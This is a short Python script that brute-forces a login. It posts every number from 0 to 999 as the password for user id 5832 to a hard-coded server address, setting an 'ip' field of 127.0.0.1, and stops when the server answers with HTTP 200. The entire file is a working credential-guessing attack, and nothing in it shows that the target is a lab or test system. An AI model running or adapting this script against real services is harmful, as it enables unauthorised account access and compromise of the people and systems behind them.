import requests
import random 
import message_printer

ms = message_printer.MessagePrinter()

for i in range(0, 1000):
    p = i
    data = {"myid":5832, "password": p, "ip": "127.0.0.1"}

    url = 'http://26.230.157.26:5000/'
    response = requests.post(url, json=data)
    if response.status_code==200:
        ms.info_message(f"#{i} {response.json()}")
        break
    ms.error_message(f"#{i} {response.json()}")
